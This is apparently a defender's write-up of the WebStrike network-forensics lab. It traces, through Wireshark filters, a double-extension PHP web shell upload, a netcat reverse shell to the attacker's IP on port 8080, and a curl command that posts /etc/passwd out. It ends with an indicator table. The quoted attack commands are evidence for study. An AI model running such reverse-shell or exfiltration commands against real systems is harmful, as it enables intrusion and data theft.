## Challenge Information
- **Name:** WebStrike Lab
- **Author:** CyberDefenders
- **Category:** Network Forensics
- **Difficulty:** Easy

---

## Scenario Overview
A suspicious file was discovered on a company web server, triggering concerns of a potential security incident within the internal network. The development team reported the anomaly, suspecting malicious activity. In response, the network team captured relevant network traffic and provided a PCAP file for analysis.
The objective of this investigation is to analyze the PCAP to determine how the file was introduced, identify any malicious behavior, and assess the scope of unauthorized activity.

---

## Objectives

1. Identify the geographical origin of the attacker
2. Determine the attacker’s User-Agent
3. Confirm whether a malicious file was uploaded
4. Identify the upload directory used by the application
5. Detect any outbound command-and-control communication
6. Identify any data exfiltration attempts

---

## Tools Used
- Wireshark
- iplocation.net

---

## Investigation & Analysis Steps

### Geographical Origin of the Attack
- To identify the origin of the attack, the PCAP was filtered for HTTP GET requests using: `http.request.method == GET`
- This revealed suspicious requests to `/admin/` and `/admin/uploads`, which are indicative of post-compromise reconnaissance or validation of uploaded files. The source IP address associated with these requests was *117.11.88.124*.
- Using an external IP geolocation service, the IP address was traced to *Tianjin, China*.
> Note: IP geolocation provides an approximate location and does not guarantee the attacker’s physical location.

### Attacker User-Agent Identification
- To identify the attacker’s User-Agent, HTTP traffic originating from the attacker’s IP address was filtered using: `ip.src == 117.11.88.124 && http`
- Inspection of the malicious HTTP requests revealed the following User-Agent string: `Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
- This information can be used to create detection or filtering rules.

### Malicious Web Shell Upload
- To determine whether a vulnerability was exploited, HTTP POST requests originating from the attacker were analyzed using: `ip.src == 117.11.88.124 && http.request.method == POST`
- Two file upload attempts were identified by following the HTTP streams.
- First upload attempt: Server response indicated “__Invalid file format__”, confirming the upload was unsuccessful.
- Second upload attempt: Server response indicated “__File uploaded successfully__”, confirming a successful upload.
- Analysis of the successful HTTP stream revealed the uploaded filename: `image.jpg.php`
- This filename indicates the use of a double-extension web shell, a common technique used to bypass file upload restrictions.

### Upload Directory Identification
- After identifying the uploaded web shell filename, the following filter was applied: `http.request.uri contains "image.jpg.php"`
- This returned a single HTTP request. By inspecting the Request URI field in the HTTP GET request, the directory used to store uploaded files was identified as: `/reviews/uploads/`

### Outbound Command-and-Control Port
- To identify the port targeted by the malicious web shell, the HTTP POST request containing the uploaded PHP payload was analyzed.
- The payload contained a Netcat reverse shell command: `nc 117.11.88.124 8080`
- This indicates that the compromised server attempted to establish an outbound connection to the attacker’s machine on port 8080, which was used for command-and-control communication.

### Data Exfiltration Attempt
- From earlier analysis, it was determined that outbound communication occurred over port 8080. To investigate potential data exfiltration, the following filter was applied: `tcp.dstport == 8080`
- Following the associated TCP stream revealed attacker-issued commands. A curl POST request was observed: `curl -X POST -d /etc/passwd http://117.11.88.124:443/`
- This indicates that the attacker attempted to exfiltrate the /etc/passwd file from the compromised server.

---

## Findings / Indicators of Compromise (IOCs)
| Type              | Indicator                                                              |
| ----------------- | ---------------------------------------------------------------------- |
| Attacker IP       | 117.11.88.124                                                          |
| Attacker Location | Tianjin, China                                                         |
| Malicious File    | image.jpg.php                                                          |
| Upload Directory  | /reviews/uploads/                                                      |
| C2 Port           | 8080                                                                   |
| Exfiltrated File  | /etc/passwd                                                            |
| User-Agent        | Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0 |
